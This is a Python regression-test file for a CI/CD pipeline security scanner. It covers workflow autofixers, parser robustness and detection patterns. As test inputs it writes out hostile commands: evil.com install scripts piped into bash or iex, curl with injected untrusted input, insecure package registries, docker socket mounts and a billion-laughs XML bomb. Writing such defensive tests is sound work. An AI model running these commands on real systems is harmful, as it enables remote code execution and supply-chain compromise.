"""Regression tests locking in the fixes for bugs A–E found in review.

Each test is named after the bug it guards; if one of these ever flips
back, it should point directly at the class of regression.
"""
from __future__ import annotations

from unittest.mock import patch

import pytest

from pipeline_check.core import autofix
from pipeline_check.core.checks.base import Finding, Severity, is_quoted_assignment


def _f(check_id: str) -> Finding:
    return Finding(
        check_id=check_id, title="t", severity=Severity.CRITICAL,
        resource="x", description="", recommendation="", passed=False,
    )


# ────────────────────────────────────────────────────────────────────────
# Bug A — GHA-002 fixer must handle the two-line checkout form.
# ────────────────────────────────────────────────────────────────────────

def test_bug_a_gha002_fixes_named_checkout_step():
    """``- name: Checkout`` with a separate ``uses:`` line is the most
    common form in large workflows. The pre-fix regex only caught
    ``- uses:`` single-line; this verifies both forms work."""
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - name: Checkout\n"
        "        uses: actions/checkout@v4\n"
    )
    out = autofix.generate_fix(_f("GHA-002"), wf)
    assert out is not None, "fixer should detect the two-line form"
    assert "persist-credentials: false" in out
    # Indent math: with: should sit at col 8 (same as `uses:`), not
    # col 10 (the bug pre-fix would have over-indented it).
    assert "        with:" in out
    assert "          persist-credentials: false" in out


def test_bug_a_gha002_still_handles_single_line_form():
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
    )
    out = autofix.generate_fix(_f("GHA-002"), wf)
    assert out is not None
    # `uses:` is at col 8; `with:` sibling should also land at col 8.
    assert "        with:" in out
    assert "          persist-credentials: false" in out


def test_bug_a_gha002_idempotent_on_named_form_already_set():
    """The existing-with-block branch must also work under the
    two-line form — otherwise re-running the fixer duplicates the key."""
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - name: Checkout\n"
        "        uses: actions/checkout@v4\n"
        "        with:\n"
        "          persist-credentials: false\n"
    )
    assert autofix.generate_fix(_f("GHA-002"), wf) is None


# ────────────────────────────────────────────────────────────────────────
# Bug B — Lambda fan-out must honor the ``provider`` kwarg.
# ────────────────────────────────────────────────────────────────────────

def test_bug_b_fanout_forwards_provider_to_scanner(monkeypatch):
    from pipeline_check import lambda_handler as lh

    captured: list[dict] = []

    class _FakeScanner:
        def __init__(self, *, pipeline, region, **kw):
            captured.append({"pipeline": pipeline, "region": region, **kw})
        def run(self):
            return []

    monkeypatch.setattr(lh, "Scanner", _FakeScanner)
    monkeypatch.delenv("PIPELINE_CHECK_RESULTS_BUCKET", raising=False)
    monkeypatch.delenv("PIPELINE_CHECK_SNS_TOPIC_ARN", raising=False)

    # Single legacy call with ``provider`` in the event.
    lh.handler({"region": "eu-west-1", "provider": "terraform", "tf_plan": "plan.json"}, None)
    assert captured[0]["pipeline"] == "terraform"
    assert captured[0]["region"] == "eu-west-1"
    assert captured[0]["tf_plan"] == "plan.json"


def test_bug_b_fanout_iterates_providers(monkeypatch):
    from pipeline_check import lambda_handler as lh

    scanned: list[str] = []

    class _FakeScanner:
        def __init__(self, *, pipeline, region, **kw):
            scanned.append(pipeline)
        def run(self):
            return []

    monkeypatch.setattr(lh, "Scanner", _FakeScanner)
    monkeypatch.delenv("PIPELINE_CHECK_RESULTS_BUCKET", raising=False)
    monkeypatch.delenv("PIPELINE_CHECK_SNS_TOPIC_ARN", raising=False)

    result = lh.handler(
        {"regions": ["us-east-1"], "providers": ["aws", "terraform"],
         "tf_plan": "plan.json"},
        None,
    )
    # Each provider was actually scanned (not silently collapsed to aws).
    assert "aws" in scanned
    assert "terraform" in scanned
    assert len(result["scans"]) == 2


# ────────────────────────────────────────────────────────────────────────
# is_quoted_assignment — the capture-to-variable safe idiom applies only to
# *runtime* shell/ADO expansions, NOT to GitHub ${{ … }} (which GitHub
# substitutes into the script text before the shell ever parses it).
# ────────────────────────────────────────────────────────────────────────

def test_is_quoted_assignment_rejects_github_expression():
    """``VAR="${{ … }}"`` is NOT a safe idiom on GitHub. The expression is
    expanded into the script text before the shell runs, so a ``"`` in an
    untrusted field (PR title, commit message) closes the assignment and the
    remainder executes as shell. These must stay flagged by GHA-003; the
    only safe handling is an ``env:`` block."""
    assert not is_quoted_assignment('TITLE="${{ github.event.pull_request.title }}"')
    assert not is_quoted_assignment('MSG="${{ github.event.head_commit.message }}"')


def test_is_quoted_assignment_recognizes_shell_and_ado():
    """Runtime expansions the shell/ADO perform themselves are safe to
    capture: bash assigns the literal value without re-parsing it."""
    assert is_quoted_assignment('BRANCH="$BITBUCKET_BRANCH"')
    assert is_quoted_assignment('BRANCH="${CI_COMMIT_BRANCH}"')
    assert is_quoted_assignment('BRANCH="$(Build.SourceBranchName)"')


def test_bug_c_is_quoted_assignment_rejects_command_injection():
    """A ``run:`` line that actually executes the untrusted value must
    still be flagged — the escape hatch is ONLY for capture-to-variable
    assignments."""
    assert not is_quoted_assignment('echo ${{ github.event.pull_request.title }}')
    assert not is_quoted_assignment('curl https://x.com/${{ github.event.issue.body }}')


def test_is_quoted_assignment_rejects_command_substitution_bypass():
    """VAR="$(curl ${{ attacker_input }})" must NOT be treated as safe
    because the command substitution executes the untrusted content
    even inside double quotes."""
    assert not is_quoted_assignment(
        'VAR="$(curl ${{ github.event.issue.title }})"'
    )
    assert not is_quoted_assignment(
        'RESULT="$(echo $UNTRUSTED_VAR)"'
    )
    # A plain shell-variable assignment without command substitution is
    # still safe (bash captures the literal value, no re-execution).
    assert is_quoted_assignment('BRANCH="$CI_COMMIT_BRANCH"')


# ────────────────────────────────────────────────────────────────────────
# Bug D — Terraform module-dir filter must use exact equality.
# ────────────────────────────────────────────────────────────────────────

def test_bug_d_terraform_filter_does_not_over_match_on_prefix(monkeypatch):
    from types import SimpleNamespace

    from pipeline_check.core import diff as diff_mod
    from pipeline_check.core.scanner import _filter_context_by_diff

    ctx = SimpleNamespace(plan={"planned_values": {"root_module": {"resources": [
        {"address": "module.vpc.aws_subnet.a"},        # module vpc, NOT changed
        {"address": "module.vpc_prod.aws_subnet.a"},   # module vpc_prod, DOES map to vpc-prod dir
    ]}}})
    # Only ``modules/vpc-prod/main.tf`` changed. Substring match would
    # have kept the vpc module too ("vpc" in "vpc-prod"). Exact match
    # (the fix) keeps only vpc_prod.
    with patch.object(diff_mod, "changed_files", return_value={"modules/vpc-prod/main.tf"}):
        _filter_context_by_diff(ctx, "origin/main", "terraform")
    kept = [r["address"] for r in ctx.plan["planned_values"]["root_module"]["resources"]]
    assert kept == []  # neither module matches "vpc-prod" exactly


def test_bug_d_terraform_filter_matches_module_dir_exactly(monkeypatch):
    from types import SimpleNamespace

    from pipeline_check.core import diff as diff_mod
    from pipeline_check.core.scanner import _filter_context_by_diff

    ctx = SimpleNamespace(plan={"planned_values": {"root_module": {"resources": [
        {"address": "module.vpc.aws_subnet.a"},
        {"address": "module.kms.aws_kms_key.a"},
    ]}}})
    with patch.object(diff_mod, "changed_files", return_value={"modules/vpc/main.tf"}):
        _filter_context_by_diff(ctx, "origin/main", "terraform")
    kept = [r["address"] for r in ctx.plan["planned_values"]["root_module"]["resources"]]
    assert kept == ["module.vpc.aws_subnet.a"]


# ────────────────────────────────────────────────────────────────────────
# Bug E — GHA-008 fixer must preserve the operator's existing comment.
# ────────────────────────────────────────────────────────────────────────

def test_bug_e_gha008_preserves_existing_comment():
    wf = 'env:\n  AWS_KEY: AKIAZ3MHALF2TESTHIJK  # tracked in INFRA-4123\n'
    out = autofix.generate_fix(_f("GHA-008"), wf)
    assert out is not None
    assert "AKIA" not in out
    assert "INFRA-4123" in out, (
        "operator's original comment was clobbered by the TODO insertion"
    )
    assert "TODO(pipeline-check)" in out


def test_bug_e_gha008_still_adds_todo_without_existing_comment():
    wf = 'env:\n  AWS_KEY: AKIAZ3MHALF2TESTHIJK\n'
    out = autofix.generate_fix(_f("GHA-008"), wf)
    assert out is not None
    assert "AKIA" not in out
    assert "TODO(pipeline-check)" in out


# ────────────────────────────────────────────────────────────────────────
# Widened shared regex coverage
# ────────────────────────────────────────────────────────────────────────

def test_remote_script_exec_primitive_new_patterns():
    from pipeline_check.core.checks._primitives import remote_script_exec
    # bash -c "$(curl ...)"
    assert remote_script_exec.scan('bash -c "$(curl https://evil.com/install.sh)"')
    # curl | sudo bash
    assert remote_script_exec.scan("curl https://evil.com/install.sh | sudo bash")
    # PowerShell irm | iex
    assert remote_script_exec.scan("irm https://evil.com/install.ps1 | iex")
    assert remote_script_exec.scan("Invoke-WebRequest https://evil.com/install.ps1 | iex")
    # python -c "requests.get("
    assert remote_script_exec.scan(
        'python -c "requests.get(\'https://evil.com/payload\')"'
    )
    # curl > x.sh && bash x
    assert remote_script_exec.scan(
        "curl https://evil.com > install.sh && bash install.sh"
    )
    # Safe: curl without pipe — should NOT match
    assert not remote_script_exec.scan(
        "curl -o output.json https://api.example.com/data"
    )


def test_docker_insecure_re_new_patterns():
    from pipeline_check.core.checks.base import DOCKER_INSECURE_RE
    # Docker socket mount
    assert DOCKER_INSECURE_RE.search(
        "docker run -v /var/run/docker.sock:/var/run/docker.sock myimage"
    )
    # PID host namespace
    assert DOCKER_INSECURE_RE.search("docker run --pid=host myimage")
    assert DOCKER_INSECURE_RE.search("docker run --pid host myimage")
    # User namespace sharing
    assert DOCKER_INSECURE_RE.search("docker run --userns=host myimage")
    # Docker compose --privileged
    assert DOCKER_INSECURE_RE.search("docker compose up --privileged")
    # Safe: normal run
    assert not DOCKER_INSECURE_RE.search("docker run --rm myimage")


def test_pkg_insecure_re_new_patterns():
    from pipeline_check.core.checks.base import PKG_INSECURE_RE
    # pip3
    assert PKG_INSECURE_RE.search("pip3 install --index-url http://evil.com/pypi pkg")
    # pip -i short form
    assert PKG_INSECURE_RE.search("pip install -i http://evil.com/pypi pkg")
    # pip --extra-index-url
    assert PKG_INSECURE_RE.search("pip install --extra-index-url http://evil.com/pypi pkg")
    # gem install
    assert PKG_INSECURE_RE.search("gem install --source http://evil.com/gems mygem")
    # nuget
    assert PKG_INSECURE_RE.search("nuget install MyPkg -Source http://evil.com/nuget")
    # cargo
    assert PKG_INSECURE_RE.search("cargo install --index http://evil.com/crates mycrate")
    # Safe: https registry
    assert not PKG_INSECURE_RE.search("pip install --index-url https://pypi.org/simple/ pkg")


def test_vuln_scan_tokens_new_entries():
    from pipeline_check.core.checks.base import VULN_SCAN_TOKENS
    for token in ("cargo audit", "bundler-audit", "docker scout",
                  "codeql-action", "semgrep ", "bandit ", "checkov ", "tfsec "):
        assert token in VULN_SCAN_TOKENS, f"{token!r} missing from VULN_SCAN_TOKENS"


def test_log_leak_set_plus_x_not_flagged_as_trace_leak():
    # ``set +x`` DISABLES xtrace (the secure idiom placed before handling
    # a secret); only ``set -x`` enables it. The disabling form must not
    # be reported as a leak.
    from pipeline_check.core.checks._primitives.log_leak import (
        scan_script_for_leaked_secrets,
    )
    assert scan_script_for_leaked_secrets("set +x\nrun_with $PASSWORD") == []
    # Regression: enabling xtrace with a secret-named var still fires,
    # including the bundled ``set -euxo`` form.
    assert scan_script_for_leaked_secrets("set -x\nrun_with $PASSWORD")
    assert scan_script_for_leaked_secrets("set -euxo pipefail\nrun_with $PASSWORD")


def test_curl_insecure_bundled_short_flags_flagged():
    # ``-k`` is rarely written standalone; it rides inside a short-flag
    # cluster (``curl -sk``, ``curl -fsSLk``, ``curl -kL``). All must flag.
    from pipeline_check.core.checks._primitives import tls_bypass

    def kinds(text):
        return [f.kind for f in tls_bypass.scan(text)]

    for text in ("curl -k https://x", "curl -sk https://x",
                 "curl -ks https://x", "curl -fsSLk https://x",
                 "curl -kL https://x"):
        assert "curl-insecure" in kinds(text), text
    # Must NOT flag uppercase ``-K`` (curl --config) or a cluster whose
    # only ``k`` is uppercase, nor a ``k``-prefixed filename argument.
    for text in ("curl -K config.txt https://x", "curl -sK https://x",
                 "curl --cacert key.pem https://x"):
        assert "curl-insecure" not in kinds(text), text


def test_go_env_w_persistent_form_flagged():
    # ``go env -w GOSUMDB=off`` writes the setting persistently and is the
    # canonical disable; it was missed because only export/inline forms
    # were matched.
    from pipeline_check.core.checks._primitives import go_insecure_env
    assert go_insecure_env.insecure_settings_in_script("go env -w GOSUMDB=off")
    assert go_insecure_env.insecure_settings_in_script(
        "go env -w GOFLAGS=-insecure"
    )
    # Regression: the export form still fires; an unrelated read does not.
    assert go_insecure_env.insecure_settings_in_script("export GOSUMDB=off")
    assert not go_insecure_env.insecure_settings_in_script("go env GOSUMDB")


def test_lockfile_pinned_dep_does_not_mask_unpinned_sibling():
    # A pinned git dep earlier on the same install line must not suppress
    # an unpinned one later.
    from pipeline_check.core.checks._primitives import lockfile_integrity as lf
    sha = "a" * 40
    assert lf.scan(f"pip install git+https://x/a.git@{sha} git+https://x/b.git")
    assert lf.scan(f"npm install git+https://x/a.git#{sha} git+https://x/b.git")
    # Regression: a single pinned dep is still safe.
    assert lf.scan(f"pip install git+https://github.com/foo/bar.git@{sha}") == []


# ────────────────────────────────────────────────────────────────────────
# Bug F — a single crashing rule must not abort the whole scan.
#   A scanner runs over config it didn't author; one rule tripping over
#   an unexpected YAML shape used to raise straight out of the
#   orchestrator and kill the scan (no findings at all). ``discover_rules``
#   now wraps each check, and the rules below guard the specific shapes
#   that crashed (scalar ``with:``, regex-metachar env names, numeric
#   cache keys).
# ────────────────────────────────────────────────────────────────────────

def test_bug_f_discover_rules_guard_contains_a_crashing_check():
    """A rule that raises is downgraded to a passing finding plus a
    logged warning, not an exception that aborts the scan."""
    from pipeline_check.core.checks.base import Severity
    from pipeline_check.core.checks.rule import Rule, _guard_check

    rule = Rule(id="X-001", title="boom", severity=Severity.HIGH)

    def boom(path, doc):
        raise ValueError("kaboom")

    guarded = _guard_check(rule, boom)
    finding = guarded("wf.yml", {})  # must not raise
    assert finding.passed
    assert finding.check_id == "X-001"


def test_bug_f_gha002_handles_scalar_with_block():
    """A scalar ``with:`` (``with: ref``) on a checkout step used to
    raise ``AttributeError: 'str' object has no attribute 'get'``."""
    from pipeline_check.core.checks.github.rules import (
        gha002_pull_request_target as gha002,
    )
    doc = {
        "on": "pull_request_target",
        "jobs": {"build": {"steps": [
            {"uses": "actions/checkout@v4", "with": "ref"},
        ]}},
    }
    finding = gha002.check("wf.yml", doc)  # must not raise
    assert finding.passed


def test_bug_f_gha003_ref_pattern_escapes_regex_metachars():
    """An env-var name with regex metacharacters used to crash
    ``re.compile`` and abort the scan."""
    import re

    from pipeline_check.core.checks.github.rules.gha003_script_injection import (
        _gha_ref_pattern,
    )
    for name in ("A(", "x|y", "[z]", "a.b", "c)"):
        re.compile(_gha_ref_pattern(name))  # must not raise re.error


def test_bug_f_gha004_handles_scalar_with_block():
    """A scalar ``with:`` on an OIDC/docker step used to raise inside
    ``_is_oidc_step`` / ``_step_consumes_scope``. It must degrade
    equivalently to a step carrying no ``with:`` at all (the keys those
    helpers read just aren't there), not crash and not silently flip the
    verdict (which ``finding is not None`` alone would never catch)."""
    from pipeline_check.core.checks.github.rules import gha004_permissions as gha004
    base = [
        {"uses": "docker/build-push-action@v5"},
        {"uses": "aws-actions/configure-aws-credentials@v4"},
    ]

    def _doc(steps: list[dict]) -> dict:
        return {
            "on": "push",
            "jobs": {"build": {
                "permissions": {"id-token": "write", "packages": "write"},
                "steps": steps,
            }},
        }

    no_with = gha004.check("wf.yml", _doc([dict(s) for s in base]))
    scalar_with = gha004.check(  # must not raise
        "wf.yml", _doc([{**s, "with": "scalar"} for s in base]),
    )
    assert scalar_with.check_id == "GHA-004"
    assert scalar_with.passed == no_with.passed


def test_bug_f_gha011_handles_numeric_cache_key():
    """A numeric ``key:`` (``key: 123``) used to raise
    ``TypeError: 'int' object is not iterable``."""
    from pipeline_check.core.checks.github.rules import gha011_cache_key as gha011
    doc = {
        "jobs": {"build": {"steps": [
            {"uses": "actions/cache@v4", "with": {"key": 123}},
        ]}},
    }
    finding = gha011.check("wf.yml", doc)  # must not raise
    assert finding.passed


def test_bug_f_as_finding_list_normalizes_single_none_and_list():
    """The list-pack orchestrators (AWS/GCP/Azure/CFN/TF) ``extend`` a
    ``list[Finding]``, but ``_guard_check`` degrades a crash to a single
    ``Finding``. ``as_finding_list`` reconciles both shapes plus ``None``."""
    from pipeline_check.core.checks.base import Finding, Severity
    from pipeline_check.core.checks.rule import as_finding_list
    one = Finding(
        check_id="A-1", title="t", severity=Severity.LOW, resource="r",
        description="d", recommendation="r", passed=True,
    )
    assert as_finding_list(None) == []
    assert as_finding_list(one) == [one]
    assert as_finding_list([one, one]) == [one, one]


def test_bug_f_list_pack_crash_keeps_sibling_rules():
    """A crashing rule in a list-shaped pack must degrade to ONE finding
    without taking down the OTHER rules in the same provider. Before the
    fix the guard returned a lone ``Finding``, the orchestrator's
    ``for f in batch`` / ``extend`` raised ``TypeError: 'Finding' object
    is not iterable``, and the surrounding scanner guard dropped every
    finding from that provider. This replicates the CFN / TF run() loop."""
    from pipeline_check.core.checks.base import Severity
    from pipeline_check.core.checks.rule import (
        Rule,
        _guard_check,
        apply_rule_metadata,
        as_finding_list,
    )
    good = Rule(id="CFN-1", title="ok", severity=Severity.HIGH)
    bad = Rule(id="CFN-2", title="boom", severity=Severity.HIGH)

    def good_check(ctx):
        return [good.fail_finding("res", "a real finding")]

    def bad_check(ctx):
        raise ValueError("malformed template")

    rules = [
        (good, _guard_check(good, good_check)),
        (bad, _guard_check(bad, bad_check)),
    ]
    findings = []
    for rule, check_fn in rules:
        batch = as_finding_list(check_fn({"ctx": 1}))  # must not raise
        for finding in batch:
            apply_rule_metadata(finding, rule)
        findings.extend(batch)
    ids = {f.check_id for f in findings}
    assert ids == {"CFN-1", "CFN-2"}  # sibling survived; crash degraded
    assert len(findings) == 2


# ────────────────────────────────────────────────────────────────────────
# Bug G — autofix must never emit a duplicate mapping key.
#   When a sibling key sat between ``uses:``/``run:`` and the
#   ``with:``/``env:`` block, the fixers inserted a SECOND block. The
#   lenient round-trip gate accepted it (last-wins), so the corruption
#   reached disk and silently dropped the original value.
# ────────────────────────────────────────────────────────────────────────

def test_bug_g_gha002_merges_into_with_after_sibling_key():
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "        name: checkout\n"
        "        with:\n"
        "          ref: abc\n"
    )
    out = autofix.generate_fix(_f("GHA-002"), wf)
    assert out is not None
    assert out.count("with:") == 1, "fixer emitted a duplicate with: key"
    assert "persist-credentials: false" in out


def test_bug_g_gha003_merges_into_env_sibling():
    wf = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        '      - run: echo "${{ github.event.pull_request.title }}"\n'
        "        env:\n"
        "          FOO: bar\n"
    )
    out = autofix.generate_fix(_f("GHA-003"), wf, tier="unsafe")
    assert out is not None
    assert out.count("env:") == 1, "fixer emitted a duplicate env: key"
    assert "FOO: bar" in out


def test_bug_g_roundtrip_safe_rejects_duplicate_keys():
    """The safety net itself: a duplicate-key payload must be rejected,
    a clean addition accepted."""
    from pipeline_check.core.autofix import _roundtrip_safe
    before = "a:\n  b: 1\n"
    assert _roundtrip_safe(before, "a:\n  b: 1\n  b: 2\n") is False
    assert _roundtrip_safe(before, "a:\n  b: 1\n  c: 2\n") is True


# ────────────────────────────────────────────────────────────────────────
# Bug H — parser / reporter robustness on hostile or off-shape input.
# ────────────────────────────────────────────────────────────────────────

def test_bug_h_osv_handles_null_aliases_and_severity():
    """An OSV record with explicit ``null`` aliases / severity used to
    raise ``TypeError`` (``.get(key, [])`` only defaults a *missing*
    key)."""
    import json

    from pipeline_check.core.checks._primitives import osv_fetcher as osv
    payload = json.dumps([
        {"id": "OSV-1", "summary": "s", "aliases": None, "severity": None},
    ])
    advisories = osv._parse_vulns(payload)  # must not raise
    assert len(advisories) == 1
    assert advisories[0].aliases == ()


def test_bug_h_maven_rejects_doctype_entity_bomb():
    """A ``pom.xml`` with a DTD (the "billion laughs" entity-expansion
    vector) is refused rather than expanded; a normal POM still parses."""
    from pipeline_check.core.checks.maven.base import _parse_pom
    bomb = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
        '<project>&lol2;</project>'
    )
    assert _parse_pom("pom.xml", bomb).parsed_ok is False
    assert _parse_pom(
        "pom.xml", "<project><groupId>g</groupId></project>",
    ).parsed_ok is True


def test_bug_h_sarif_region_requires_start_line():
    """A SARIF region must not carry ``startColumn`` / ``endLine`` /
    ``endColumn`` without ``startLine`` (GitHub code scanning rejects
    it). A column-only location degrades to file-level."""
    from pipeline_check.core import sarif_reporter as sr
    from pipeline_check.core.checks.base import Finding, Location, Severity

    col_only = Finding(
        check_id="X-1", title="t", severity=Severity.HIGH, resource="f.yml",
        description="d", recommendation="r", passed=False,
        locations=[Location(path="f.yml", start_column=5)],
    )
    phys = sr._finding_to_result(col_only, {})["locations"][0]["physicalLocation"]
    assert "region" not in phys

    with_line = Finding(
        check_id="X-1", title="t", severity=Severity.HIGH, resource="f.yml",
        description="d", recommendation="r", passed=False,
        locations=[Location(
            path="f.yml", start_line=3, start_column=5, end_column=9,
        )],
    )
    region = (
        sr._finding_to_result(with_line, {})
        ["locations"][0]["physicalLocation"]["region"]
    )
    assert region["startLine"] == 3
    assert region["startColumn"] == 5


def test_bug_h_junit_strips_xml_invalid_control_chars():
    """A finding field carrying an XML-forbidden control byte (NUL, etc.)
    must not produce non-well-formed JUnit XML."""
    import xml.dom.minidom as minidom

    from pipeline_check.core.checks.base import Finding, Severity
    from pipeline_check.core.junit_reporter import report_junit
    from pipeline_check.core.scorer import score

    f = Finding(
        check_id="GHA-1", title="bad\x00title", severity=Severity.HIGH,
        resource="f.yml", description="desc with \x00 and \x01 controls",
        recommendation="r", passed=False,
    )
    out = report_junit([f], score([f]))
    assert "\x00" not in out and "\x01" not in out
    minidom.parseString(out)  # raises if not well-formed


# ────────────────────────────────────────────────────────────────────────
# Bug I — file I/O and input-shape robustness OUTSIDE the rule guard.
#   Config / ignore-file / fleet reads missed UnicodeDecodeError (a
#   ValueError, not OSError), so a non-UTF-8 file aborted the whole
#   process; report writes raised raw OSError on a bad --output-file; and
#   a handful of ``.get(k, default)`` sites crashed on an explicit null.
# ────────────────────────────────────────────────────────────────────────

def test_bug_i_config_load_survives_non_utf8(tmp_path):
    from pipeline_check.core.config import _load_path
    p = tmp_path / "cfg.yml"
    p.write_bytes(b"pipeline: caf\xe9\n")  # latin-1, invalid UTF-8
    assert _load_path(p) == {}  # must not raise


def test_bug_i_ignore_files_survive_non_utf8(tmp_path):
    from pipeline_check.core.gate import _load_ignore_flat, _load_ignore_yaml
    flat = tmp_path / ".ig"
    flat.write_bytes(b"GHA-001: caf\xe9\n")
    assert _load_ignore_flat(flat) == []  # must not raise
    yml = tmp_path / "ig.yml"
    yml.write_bytes(b"- caf\xe9\n")
    assert _load_ignore_yaml(yml) == []  # must not raise


def test_bug_i_pyproject_load_survives_non_utf8(tmp_path, capsys):
    # ``tomllib.load`` decodes UTF-8 and raises ``UnicodeDecodeError``
    # (a sibling of ``TOMLDecodeError``, not a subclass), which the
    # sibling ``_load_path`` guarded but ``_load_pyproject`` did not.
    from pipeline_check.core.config import _load_pyproject
    p = tmp_path / "pyproject.toml"
    p.write_bytes(b'[tool.pipeline_check]\nfail_on = "caf\xe9"\n')
    assert _load_pyproject(p) == {}  # must not raise
    # The file carries a ``[tool.pipeline_check]`` table, so the parse
    # failure is the user's pipeline-check config being stranded; surface
    # it rather than dropping it silently the way ``_load_path`` does.
    assert "could not parse" in capsys.readouterr().err


def test_pyproject_parse_failure_silent_without_our_table(tmp_path, capsys):
    # ``pyproject.toml`` is auto-probed, so a malformed file that doesn't
    # configure pipeline-check at all must stay silent: warning about an
    # unrelated project's broken pyproject would be noise.
    from pipeline_check.core.config import _load_pyproject
    p = tmp_path / "pyproject.toml"
    p.write_text('[build-system]\nrequires = [unterminated\n', encoding="utf-8")
    assert _load_pyproject(p) == {}  # must not raise
    assert capsys.readouterr().err == ""


def test_bug_i_baseline_load_survives_non_utf8(tmp_path):
    # ``load_baseline`` promises an empty set "rather than raising" so it
    # can't crash CI; a non-UTF-8 file raised ``UnicodeDecodeError``.
    from pipeline_check.core.gate import load_baseline
    p = tmp_path / "baseline.json"
    p.write_bytes(b'{"findings": "caf\xe9"}\n')
    assert load_baseline(p) == set()  # must not raise


def test_bug_i_fleet_repo_list_non_utf8_is_clean_error(tmp_path):
    from pipeline_check.core.fleet import load_repo_list
    p = tmp_path / "repos.yml"
    p.write_bytes(b"- caf\xe9\n")
    with pytest.raises(ValueError):  # not a raw UnicodeDecodeError traceback
        load_repo_list(p)


def test_bug_i_emit_report_to_directory_is_usage_error(tmp_path):
    import click

    from pipeline_check.cli import _emit_report
    with pytest.raises(click.UsageError):
        _emit_report("body", str(tmp_path), "JSON report", quiet=True)


def test_bug_i_osv_fetch_handles_non_dict_response():
    from unittest.mock import MagicMock, patch

    from pipeline_check.core.checks._primitives import osv_fetcher as osv
    resp = MagicMock()
    resp.read.return_value = b'["not", "an", "object"]'
    cm = MagicMock()
    cm.__enter__.return_value = resp
    with patch.object(osv.urllib.request, "urlopen", return_value=cm):
        results, error = osv._fetch_batch([("pkg", "1.0", "npm")])
    assert results == {}
    assert error  # graceful error string, not an AttributeError


def test_bug_i_cfn_policy_handles_null_statement():
    from pipeline_check.core.checks.cloudformation.ecr import _ecr003_public_policy
    from pipeline_check.core.checks.cloudformation.s3 import (
        _s3005_secure_transport,
    )
    # ``Statement: null`` previously raised "NoneType is not iterable".
    f1 = _s3005_secure_transport(
        {"PolicyDocument": {"Statement": None}}, "bucket",
    )
    assert f1.check_id == "S3-005"
    f2 = _ecr003_public_policy(
        {"RepositoryPolicyText": {"Statement": None}}, "repo",
    )
    assert f2.check_id == "ECR-003"


def test_bug_i_argocd_handles_spec_as_list():
    from pipeline_check.core.checks.argocd.base import application_sources

    class _App:
        kind = "ApplicationSet"
        data = {"spec": [1, 2, 3]}  # spec authored as a sequence

    assert list(application_sources(_App())) == []  # must not raise


# ────────────────────────────────────────────────────────────────────────
# Bug J — a pathologically deep YAML document must not crash the scan.
#   PyYAML's parser is recursive, so a deeply-nested file raised
#   RecursionError straight out of the loader (during context build,
#   before the per-rule guard) and aborted the whole scan with a raw
#   traceback. A scanned PR can craft this. The shared loaders now treat
#   RecursionError / MemoryError like a parse failure and skip the file.
# ────────────────────────────────────────────────────────────────────────

def test_bug_j_deeply_nested_yaml_degrades_not_crashes(tmp_path):
    from pipeline_check.core.checks._yaml_files import load_yaml_files

    deep = "a:\n" + "".join("  " * i + "k:\n" for i in range(1, 600))
    p = tmp_path / "deep.yml"
    p.write_text(deep, encoding="utf-8")
    loaded, warnings, skipped = load_yaml_files([p])  # must not raise
    assert loaded == []
    assert skipped == 1
    assert warnings and "too deeply nested" in warnings[0]


def test_bug_j_deeply_nested_yaml_scan_does_not_crash(tmp_path):
    """End-to-end: the github provider scans a deeply-nested workflow
    without an unhandled RecursionError reaching the scanner."""
    from pipeline_check.core.checks.github.base import GitHubContext
    from pipeline_check.core.checks.github.workflows import WorkflowChecks

    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    deep = "on: push\na:\n" + "".join("  " * i + "k:\n" for i in range(1, 600))
    (wf / "deep.yml").write_text(deep, encoding="utf-8")
    ctx = GitHubContext.from_path(wf)  # must not raise
    WorkflowChecks(ctx).run()  # must not raise


# ────────────────────────────────────────────────────────────────────────
# Bug K — the auxiliary YAML loaders Bug J missed must also degrade.
#   The Bug J sweep hardened the shared provider parse boundaries
#   (_yaml_files + a few inline ones) but left the secondary loaders that
#   parse their own files: the GitHub local-action / resolved-callee
#   parsers (PR-reachable via a planted ``action.yml`` / composite ref),
#   the ArgoCD inline repo-blob parser, and the custom-rule / policy
#   loaders. Each caught yaml.YAMLError but not the RecursionError /
#   MemoryError builtins. They now degrade (scan loaders) or fail fast
#   with a clean domain error (the user-config loaders).
# ────────────────────────────────────────────────────────────────────────

def test_bug_k_local_action_deeply_nested_degrades(tmp_path):
    from pipeline_check.core.checks.github.local_actions import (
        _parse_action_yaml,
    )

    deep = "name: x\na:\n" + "".join("  " * i + "k:\n" for i in range(1, 600))
    action = tmp_path / "action.yml"
    action.write_text(deep, encoding="utf-8")
    warnings: list[str] = []
    assert _parse_action_yaml(action, warnings) is None  # must not raise
    assert warnings and "too deeply nested" in warnings[0]


def test_bug_k_argocd_repo_blob_deeply_nested_degrades(monkeypatch):
    from pipeline_check.core.checks.argocd.rules import (
        argocd005_repo_plaintext_secret as mod,
    )

    def _boom(_text):
        raise RecursionError("maximum recursion depth exceeded")

    # The blob loader uses the C-accelerated safe_load_yaml, which is
    # iterative when libyaml is present; force the builtin to prove the
    # except clause degrades regardless of the installed YAML backend.
    monkeypatch.setattr(mod, "safe_load_yaml", _boom)
    assert mod._scan_repo_blob("- url: https://x") == []  # must not raise


def test_bug_k_resolver_callee_deeply_nested_degrades(monkeypatch):
    from types import SimpleNamespace

    from pipeline_check.core.checks.github import resolver as mod

    def _boom(_text):
        raise RecursionError("maximum recursion depth exceeded")

    monkeypatch.setattr(mod, "safe_load_yaml", _boom)
    r = mod.Resolver(fetcher=object())  # _build_workflow never touches it
    pending = SimpleNamespace(
        ref=SimpleNamespace(raw="acme/deep@v1"),
        kind="action",
        caller_path="wf.yml",
    )
    assert r._build_workflow(pending, b"runs:\n  using: composite") is None
    assert any("too deeply nested" in f for f in r.stats.failures)


def test_bug_k_custom_rules_deeply_nested_fails_clean(tmp_path):
    import pytest

    from pipeline_check.core.checks.custom.loader import (
        CustomRuleError,
        load_custom_rules,
    )

    deep = "a:\n" + "".join("  " * i + "k:\n" for i in range(1, 600))
    rule_file = tmp_path / "rules.yml"
    rule_file.write_text(deep, encoding="utf-8")
